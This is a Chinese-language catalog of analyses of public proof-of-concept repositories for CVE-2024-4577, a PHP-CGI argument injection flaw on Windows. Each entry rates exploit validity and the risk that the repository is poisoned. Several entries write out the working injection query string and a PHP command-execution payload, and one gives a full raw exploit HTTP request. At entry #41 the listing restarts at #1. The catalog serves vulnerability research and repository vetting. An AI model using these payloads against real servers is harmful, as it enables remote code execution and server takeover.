**利用条件:** Windows服务器，使用Apache和PHP-CGI，系统设置为使用特定的代码页（可能涉及"Best-Fit"行为）。目标服务器必须配置为以CGI模式运行PHP脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时会受到影响。该漏洞源于Windows在将命令行参数传递给Win32 API函数时，会使用“Best-Fit”行为转换字符。PHP CGI模块可能会错误地将这些转换后的字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递恶意选项。该漏洞利用方式涉及构造包含特定字符的HTTP请求，这些字符在经过Windows的字符转换后，会被PHP-CGI解析为恶意的PHP配置指令，例如`allow_url_include`和`auto_prepend_file`，进而包含远程或本地文件，最终导致任意代码执行。

**漏洞利用有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞利用是有效的。搜索结果表明，CVE-2024-4577自披露后不久就出现了大量的利用尝试，并且已被积极利用。

**投毒风险分析：**
提供的PoC代码主要包含以下部分：
1.  **扫描模块：** 用于检测目标是否易受攻击，通过发送包含特定payload的请求来检查响应中是否存在“Test”字符串。
2.  **利用模块：**  利用`allow_url_include`和`auto_prepend_file`指令，通过POST请求发送PHP payload来执行任意代码。

虽然该代码的功能主要是漏洞利用，但存在一定的投毒风险，主要体现在以下几个方面：
1.  **Payload文件：**  利用模块需要指定一个payload文件，如果用户使用了恶意的payload文件，可能会对目标系统造成损害。**这是主要投毒风险来源。**
2.  **Payload混淆：**  Payload中使用了`%AD`，这是一种简单的混淆手段，可能会被用于绕过一些简单的安全检测，也可能被用于隐藏恶意代码。
3.  **依赖风险：** 虽然代码依赖少,但是如果`requirements.txt`文件被篡改，可能导致引入恶意依赖。

综合考虑，PoC本身实现的投毒风险较低，主要风险在于用户提供的`payload_file`可能包含恶意代码。仓库中`README.md`文件提供了下载链接，可能存在被篡改的风险。

**利用方式总结：**
1.  **目标确认：** 确认目标系统满足漏洞利用的条件（Windows、PHP-CGI、受影响的PHP版本、特定的代码页设置）。
2.  **发送恶意请求：**  构造包含恶意payload的HTTP请求，该payload包含经过编码的PHP配置指令，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。
3.  **执行任意代码：**  通过`auto_prepend_file`包含远程或本地文件，执行其中的PHP代码。通常，攻击者会利用此漏洞上传webshell或执行其他恶意操作。
4. **利用编码绕过:** 某些特定代码页设置下，对某些特殊字符进行转换，才可触发该漏洞。

**项目地址:** [gh-ost00/CVE-2024-4577-RCE](https://github.com/gh-ost00/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #35

**来源**: [CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS命令注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8, 且运行在Windows的CGI模式下，开启了Best Fit策略的系统

**利用条件:** 服务器运行在Windows系统，使用Apache和PHP-CGI，系统启用了Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞是一个PHP-CGI参数注入漏洞，当PHP以CGI模式在Windows服务器上运行时，如果启用了'Best Fit'代码页转换，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而导致任意代码执行。

**有效性：**
根据漏洞描述和利用代码，该漏洞的PoC代码是有效的。PoC通过在URL中注入`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`，并POST一段PHP代码，利用`allow_url_include`和`auto_prepend_file`的特性，实现远程代码执行。

**投毒风险：**
提供的PoC代码本身不包含明显的恶意代码或后门。脚本的功能是发送带有特定参数的HTTP POST请求以测试目标服务器是否存在漏洞。它使用 `phpinfo()` 函数来验证漏洞的存在，而没有尝试执行任何其他恶意操作. 因此，投毒风险为0%。

**利用方式：**
1.  **漏洞触发条件：**  目标服务器必须是运行在Windows系统上的PHP，并且是以CGI模式运行。另外，还需要开启了Best-Fit代码页转换。
2.  **攻击向量：**  通过构造恶意的HTTP请求，主要是GET参数，利用Windows系统的Best-Fit特性将某些字符转换为PHP可识别的选项参数。
3.  **利用方式：**  攻击者通过在URL中注入特定的参数，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input` 允许执行POST数据中的PHP代码。
4.  **RCE：** 构造包含PHP代码的POST请求体，例如`<?php system($_GET['cmd']); ?>`，配合URL中的参数，即可在目标服务器上执行任意命令。也可以直接利用`<?php phpinfo(); ?>`来探测漏洞存在.

该漏洞利用的关键在于Windows系统的字符编码转换和PHP-CGI对参数的处理方式。

**项目地址:** [gmh5225/CVE-2024-4577-PHP-RCE](https://github.com/gmh5225/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #36

**来源**: [CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md](../2024/CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows服务器，以CGI模式运行PHP，并启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP CGI参数注入漏洞，存在于Windows上以CGI模式运行的PHP版本中。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上执行任意PHP代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的Nuclei模板，该漏洞利用的有效性较高。搜索引擎结果显示，该漏洞在公开后不久就观察到了大量的利用尝试，并且有可用的PoC代码。

**投毒风险：**
Nuclei模板本身主要用于漏洞检测，其目的是验证目标是否存在CVE-2024-4577漏洞。模板中的Payload会尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含并执行PHP代码。这里利用`php://input`伪协议。模板会检查返回的内容是否包含`md5("CVE_2024_4577_TEST")`的结果来确认漏洞是否存在。代码本身并不包含明显的恶意代码，而是尝试去检测是否存在漏洞，判定投毒风险为5%主要是考虑到这个yaml文件会被攻击者利用.

**利用方式：**
1.  **环境准备：** 目标服务器需要是Windows系统，并且PHP以CGI模式运行。
2.  **发送恶意请求：** 攻击者构造包含恶意参数的HTTP请求。核心是利用URL中的特殊字符，结合Windows的Best-Fit字符转换特性，注入额外的PHP配置参数。
3.  **参数注入：** 注入`allow_url_include=1`和`auto_prepend_file=php://input`。`allow_url_include=1`允许包含远程文件，`auto_prepend_file=php://input`会将POST请求体的内容作为PHP代码执行。
4.  **执行任意代码：**  通过POST请求体传递要执行的PHP代码。

该漏洞利用的关键在于利用Windows系统的字符转换行为，以及PHP CGI对命令行参数解析的缺陷。攻击者通过构造特定的URL，可以将任意PHP代码注入到服务器并执行。

**项目地址:** [huseyinstif/CVE-2024-4577-Nuclei-Template](https://github.com/huseyinstif/CVE-2024-4577-Nuclei-Template)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #37

**来源**: [CVE-2024-4577-ibrahmsql_CVE-2024-4577.md](../2024/CVE-2024-4577-ibrahmsql_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 8.3.8, < 8.2.20, < 8.1.29

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，开启Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP CGI中的远程代码执行漏洞。该漏洞的利用方式是利用Windows系统在特定代码页设置下，对传递给Win32 API的命令行参数进行"Best-Fit"转换的特性。攻击者通过构造特殊字符，使得PHP CGI在解析命令行参数时，将这些字符错误地解析为PHP选项，从而可以注入恶意PHP代码或执行系统命令。

**有效性：**

提供的POC代码看起来是有效的。它尝试通过在URL中注入PHP选项来利用漏洞，例如 `cgi.force_redirect=0` 和 `auto_prepend_file=php://input`。 `auto_prepend_file=php://input` 允许攻击者将POST请求的内容作为PHP代码执行。搜索引擎结果也表明该漏洞已被积极利用。

**投毒风险：**

该POC代码没有明显的投毒迹象。虽然可以利用此漏洞执行任意代码，但是POC本身没有包含任何试图在目标机器上安装后门或执行恶意操作的代码。代码只是构建并发送利用请求，执行指定的命令。 因此，投毒风险评估为0%。

**利用方式：**

1.  **确定目标环境：**  目标服务器必须是Windows系统，并且PHP以CGI模式运行。需要确认目标服务器上PHP的版本是否在受影响的范围内（< 8.3.8, < 8.2.20, < 8.1.29）。同时确认服务器是否开启了Best-Fit代码页转换。
2.  **构造恶意URL：**  构建包含恶意PHP选项的URL。关键是使用"Best-Fit"转换可能发生的字符来代替标准PHP选项分隔符。`%AD` (软连字符)是一个常用的选择。
3.  **发送请求：**  使用POST方法向目标服务器发送包含恶意URL和PHP代码的请求。PHP代码会被`auto_prepend_file=php://input`选项包含并执行。
4.  **执行任意代码：**  成功利用后，攻击者可以在目标服务器上执行任意PHP代码或系统命令。

**缓解措施：**

*   升级PHP到不受影响的版本(>= 8.3.8, >= 8.2.20, >= 8.1.29)。
*   禁用CGI模式的PHP，如果可能的话，使用其他方式运行PHP，例如FastCGI或PHP-FPM。
*   配置Web服务器，确保不允许未授权的PHP文件执行。

**项目地址:** [ibrahmsql/CVE-2024-4577](https://github.com/ibrahmsql/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #38

**来源**: [CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows系统，PHP运行于CGI模式，系统启用了使用 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP CGI 参数注入漏洞，存在于 Windows 平台运行于 CGI 模式下的 PHP 版本中。当系统配置为使用某些代码页时，Windows 的 "Best-Fit" 行为可能会替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块错误地将这些字符解释为 PHP 选项，允许恶意用户将选项传递给 PHP 解释器，从而导致泄露源代码、执行任意 PHP 代码等。

**有效性：**
提供的PoC代码看起来有效。它通过向目标URL发送特制的请求，利用`allow_url_include`和`auto_prepend_file`这两个PHP配置项来实现远程代码执行。扫描函数检测目标是否存在漏洞，利用函数通过POST请求发送包含恶意PHP代码的文件来执行命令。

**投毒风险：**
此仓库中可能存在的投毒代码的风险较低，约为 10%。主要基于以下几点考虑：

*   **代码简洁性：** PoC 代码相对简单，易于审查，降低了隐藏恶意代码的可能性。
*   **明确的目的：** 代码的目的明确，即利用已知的漏洞，没有发现额外的、不必要的功能。
*   **作者信誉（待评估）：** 作者的信誉需要进一步验证，但从代码本身来看，没有明显的恶意行为。

尽管风险较低，仍然需要保持警惕。潜在的投毒方式可能包括：

*   **混淆代码：** 在 PHP payload 中插入难以察觉的恶意代码。
*   **依赖项：** 引入包含恶意代码的第三方库（虽然当前 PoC 没有依赖项）。

**利用方式：**
1.  攻击者首先需要确定目标系统是否满足漏洞利用的先决条件：Windows + CGI + 受影响的 PHP 版本 + 启用了 Best-Fit 编码页。
2.  攻击者构造一个包含特殊字符的 URL，该 URL 中的字符会被 Windows 的 Best-Fit 算法转换成 PHP 选项。
3.  攻击者利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并将 POST 请求的内容作为 PHP 代码执行。
4.  攻击者通过 POST 请求发送包含恶意 PHP 代码的 payload，例如执行系统命令、读取文件等。
5.  服务器执行攻击者提供的 PHP 代码，攻击者从而获得对服务器的控制权。

**项目地址:** [l0n3m4n/CVE-2024-4577-RCE](https://github.com/l0n3m4n/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #39

**来源**: [CVE-2024-4577-longhoangth18_CVE-2024-4577.md](../2024/CVE-2024-4577-longhoangth18_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统使用某些开启了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows系统上PHP-CGI模式的远程代码执行漏洞。当PHP在CGI模式下运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行任意PHP代码。

**有效性：**
提供的POC代码有效。它通过在URL中注入恶意参数，利用`allow_url_include`和`auto_prepend_file`选项来包含和执行POST请求中提供的PHP代码。

**投毒风险：**
该POC代码本身的功能是利用漏洞进行远程代码执行。代码中添加了protocol检测，确保target可用。但仔细检查后发现，README.md文件不完整，文件末尾被截断。由于github仓库图片链接域名存在github.com，该仓库可能存在钓鱼风险，因此投毒风险预估为1%。

**利用方式：**
1.  **扫描：** 使用脚本的`-s`参数扫描目标URL是否存在漏洞。扫描器通过构造包含特定payload的URL，并发送POST请求，检测服务器返回结果中是否包含预期字符串（“Test”）。
2.  **利用：** 使用脚本的`-e`参数，配合`-p`参数指定包含PHP代码的payload文件，利用漏洞执行任意PHP代码。攻击者通过构造包含特定payload的URL，并发送包含PHP代码的POST请求。
3. 脚本通过`allow_url_include`和`auto_prepend_file`配置项的组合来包含并执行php代码。

**项目地址:** [longhoangth18/CVE-2024-4577](https://github.com/longhoangth18/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #40

**来源**: [CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577 PHP-CGI 参数注入导致 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 严重，未经身份验证的攻击者可以在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，并且运行在Windows的CGI模式下

**利用条件:** 需要在Windows上运行的PHP，并配置为CGI模式，且开启了使用 "Best Fit" 策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**

从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛证实有效，且存在公开可用的PoC代码。Akamai 等安全公司已经观察到针对该漏洞的利用尝试。

提供的PoC代码通过 DNS rebinding 技术，允许攻击者绕过同源策略 (SOP)，从而访问内部网络基础设施上运行的 PHP-CGI 实例。攻击者可以通过修改`client.html`中的`payload`变量来定制要执行的 PHP 代码。

**投毒风险：**

PoC 代码主要目的是利用 DNS rebinding 攻击内部网络，并执行指定的 PHP 代码。虽然代码本身用于验证漏洞和进行渗透测试，但存在以下潜在风险：

1.  **DNS rebinding 的风险：** DNS rebinding 攻击可能导致受害者浏览器访问攻击者控制的恶意站点，从而造成信息泄露或其他安全问题。
2.  **后门代码：** 检查代码发现，代码中存在硬编码的IP地址，攻击者可以通过修改这些IP地址进行恶意活动，或者在`client.html`中插入恶意代码，诱导用户执行。
3.  **依赖第三方服务：** 代码依赖 DuckDNS，若 DuckDNS 服务被攻破，可能导致利用代码被篡改。

综合评估，代码本身存在一定的风险，但恶意投毒的可能性较低，主要风险集中在使用者对PoC代码的修改和DNS rebinding攻击本身带来的风险。因此，投毒风险评估为 10%。

**利用方式：**

1.  **配置 DuckDNS：** 攻击者需要在 DuckDNS 注册一个域名，并获取 token。
2.  **配置 PoC 代码：** 攻击者需要修改`server.py` 中的 `PUBLIC_IP`、`DUCKDNS_DOMAIN` 和 `DUCKDNS_TOKEN`，以及 `client.html` 中的 `PAYLOAD_TARGETS` 来指定要攻击的目标 IP 地址。同时，修改`client.html`中的`payload`变量，来指定要执行的php代码。
3.  **运行 server.py：** 攻击者运行 `server.py` 脚本，该脚本负责更新 DuckDNS 的 DNS 记录。
4.  **诱骗受害者访问 client.html：** 攻击者诱骗受害者（内部网络用户）使用浏览器访问 `client.html` 页面。`client.html` 会执行 DNS rebinding 攻击，将域名解析到内部网络的 IP 地址，然后向目标 PHP-CGI 服务器发送包含恶意 PHP 代码的请求。
5.  **执行任意代码：** 如果目标服务器存在 CVE-2024-4577 漏洞，恶意 PHP 代码将被执行，攻击者从而获得服务器的控制权。

**项目地址:** [mananjain61/PHP-CGI-INTERNAL-RCE](https://github.com/mananjain61/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #41

**来源**: [CVE-2024-4577-mistakes1337_CVE-2024-4577.md](../2024/CVE-2024-4577-mistakes1337_CVE-2024-4577.md)

# CVE-2024-4577

> 📦 该CVE有 **53** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md](../2024/CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md)

## CVE-2024-4577 - PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统, PHP 使用 CGI 模式运行, 启用使用“Best Fit”策略的代码页, Apache 服务器

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时会受到影响。漏洞源于 Windows 在某些代码页配置下，“Best Fit” 策略可能导致命令行参数中的字符被错误转换，PHP-CGI 模块会将这些字符误解为 PHP 选项，从而允许攻击者向 PHP 传递恶意参数。 

**有效性：**
提供的 POC 代码通过 POST 请求向服务器发送包含恶意 PHP 代码的请求体，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行请求体中的 PHP 代码。如果服务器返回“vulnerable”，则表示漏洞利用成功。从漏洞原理以及多个参考链接中漏洞利用的描述，可以判断该POC代码是有效的。

**投毒风险：**
提供的漏洞利用代码主要是用于验证漏洞是否存在，本身并没有发现明显的恶意代码或后门，但是从github仓库的拉取和环境配置过程中存在一定风险。投毒风险较低，估计为 5%。

**利用方式：**
1.  **环境准备：** 搭建存在漏洞的 PHP 环境，包括：
    *   Windows 系统
    *   PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8
    *   Apache 服务器
    *   PHP 以 CGI 模式运行
    *   配置系统 Locale 为日语、简体中文或繁体中文，以启用 Best-Fit 字符转换。
2.  **发送恶意请求：**  构造包含恶意 PHP 代码的 POST 请求，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行恶意代码。例如，使用以下请求：
```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{HOST}}
User-Agent: curl/8.3.0
Accept: /*
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo \"vulnerable\"; ?>
```

3.  **远程代码执行：** 成功利用漏洞后，攻击者可以在服务器上执行任意 PHP 代码，从而控制服务器。

**参考链接：**
*   [https://nvd.nist.gov/vuln/detail/cve-2024-4577](https://nvd.nist.gov/vuln/detail/cve-2024-4577)
*   [https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure)
*   [https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong](https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong)
*   [https://github.com/xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**项目地址:** [AlperenY-cs/CVE-2024-4577](https://github.com/AlperenY-cs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #2

**来源**: [CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md](../2024/CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** PHP running in CGI mode on Windows with a codepage using "Best Fit" strategy enabled. 需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统上以 CGI 模式运行时出现的一个参数注入漏洞。由于 Windows 系统使用了 "Best Fit" 策略的代码页，恶意用户可以通过构造特殊字符，使得 PHP CGI 模块错误地将这些字符解析为 PHP 选项。这允许攻击者向 PHP 解释器传递恶意参数，从而执行任意 PHP 代码或者泄露源代码。

**利用方式：**

1.  **攻击向量：** 通过 HTTP 请求的 URL query string 传递恶意参数。
2.  **漏洞原理：**  Windows 的 "Best Fit" 代码页转换功能可能会将某些字符转换为其他字符，导致 PHP CGI 错误解析命令行参数。
3.  **攻击步骤：**
    *   构造包含恶意 PHP 选项的 URL，例如 `-d allow_url_include=1 -d auto_prepend_file=php://input`，允许包含远程文件。
    *   发送包含 PHP 代码的 POST 请求。
    *   利用 `php://input` 或 `data://` 等 wrapper 执行恶意代码。

**POC 代码分析：**

POC 代码 (`CVE-2024-4577.py`) 主要功能如下：

*   **Base64 编码：** 提供 Base64 编码函数，用于绕过某些过滤。
*   **服务器监听：** 包含一个简单的 TCP 服务器，可能用于接收反弹 shell（但代码中没有明确实现反弹 shell 功能）。
*   **SSL 检查：** 检查目标 URL 是否支持 SSL/TLS。
*   **WAF 检测：** 尝试绕过 Web 应用防火墙 (WAF)。 通过修改lfi参数和重新组合绕过waf。
*   **语法检查：** 通过发送包含特定 Flag 的 PHP 代码，检查目标是否容易受到Payload的影响并判断哪种方式可行。
*   **RCE 执行：** 利用 `php://input` 或 `data://` wrapper 执行任意 PHP 代码。

**投毒风险分析：**

该 POC 代码存在一定的投毒风险，约为 10%。主要风险点在于代码中的一些函数，例如服务器监听函数，可能被用于植入后门或执行其他恶意操作。虽然代码中没有明显的恶意行为，但攻击者可以修改代码以实现持久化控制或窃取敏感信息。代码中包含尝试绕过waf的操作,虽然出发点是尝试漏洞利用, 但也可能隐藏其他利用。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已经得到广泛证实，并且存在实际的利用案例。POC 代码的有效性较高，可以成功利用该漏洞在目标系统上执行任意 PHP 代码。

**总结：**

CVE-2024-4577 是一个严重的安全漏洞，攻击者可以利用该漏洞在受影响的 Windows 服务器上执行任意代码。建议尽快升级 PHP 版本，或者采取其他缓解措施。

**项目地址:** [BTtea/CVE-2024-4577-RCE-PoC](https://github.com/BTtea/CVE-2024-4577-RCE-PoC)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #3

**来源**: [CVE-2024-4577-Chocapikk_CVE-2024-4577.md](../2024/CVE-2024-4577-Chocapikk_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP-CGI模式，开启了使用"Best Fit"策略的编码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 环境下，使用 Apache 和 PHP-CGI 模式时存在的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 会使用 "Best-Fit" 策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**

1.  攻击者需要向目标服务器发送特制的HTTP请求，该请求包含畸形的 URL，URL 中包含经过特定编码的 PHP 选项，例如 `-d` 参数，用于设置 PHP 配置指令。
2.  利用 Windows 的 "Best-Fit" 字符转换特性，构造出可被 PHP-CGI 解析的参数，例如，通过替换 `-` 为 `%AD`， `=` 为 `%3D`。
3.  利用 `auto_prepend_file=php://input` 允许执行 POST 请求中的 PHP 代码。
4.  将需要执行的 PHP 代码放在 POST 请求体中，例如 `<?php system('whoami'); ?>`。
5.  目标服务器的 PHP-CGI 进程将执行攻击者提供的 PHP 代码，从而实现远程代码执行。

**有效性：**

提供的 POC 代码 `exploit.py` 尝试自动化利用此漏洞。它包含以下关键步骤：

*   **路径探测:** 尝试不同的 PHP-CGI 路径（例如 `/php-cgi/php-cgi.exe`）。
*   **参数构造:** 通过替换特殊字符来构造 PHP 配置参数，例如 `-d`。
*   **代码注入:** 使用 `auto_prepend_file` 和 `php://input` 将 PHP 代码注入到目标服务器。
*   **命令执行:**  使用 `system()` 函数执行指定的命令。

因此，提供的 POC 代码在满足漏洞利用条件的环境下是有效的。

**投毒风险：**

`exploit.py` 主要功能是扫描和利用漏洞，但也存在一定的投毒风险：

*   **依赖项风险：** `requirements.txt` 中可能存在恶意依赖项，尽管可能性较低，但仍需要注意。可以通过检查 `requirements.txt` 中列出的依赖项及其来源来降低风险。
*   **代码逻辑风险：** 即使代码表面上是无害的，也可能存在隐藏的恶意逻辑。例如，作者可能会添加收集目标信息的代码，并将这些信息发送到外部服务器。

代码中存在base64编码和解码,存在一定的风险,需要人工检查。
总体来说，该代码的投毒风险评估为10%，主要集中在依赖项和隐藏逻辑方面。需要进行代码审计以确定是否存在恶意代码。


**项目地址:** [Chocapikk/CVE-2024-4577](https://github.com/Chocapikk/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #4

**来源**: [CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md](../2024/CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP运行在CGI模式下，开启了使用“Best Fit”策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的严重漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，则 Windows 可能会使用“Best-Fit”行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**漏洞利用分析：**

提供的 Python 脚本 `CVE-2024-4577.py` 旨在批量检测和利用此漏洞。

1.  **有效性：** 根据漏洞描述和漏洞利用代码，该PoC利用`auto_prepend_file`和`allow_url_include`选项来包含`php://input`，从而允许攻击者注入任意 PHP 代码。如果目标环境满足漏洞利用的先决条件（Windows，CGI模式，特定版本等），则该PoC应该是有效的。搜索结果也表明该漏洞已被积极利用。
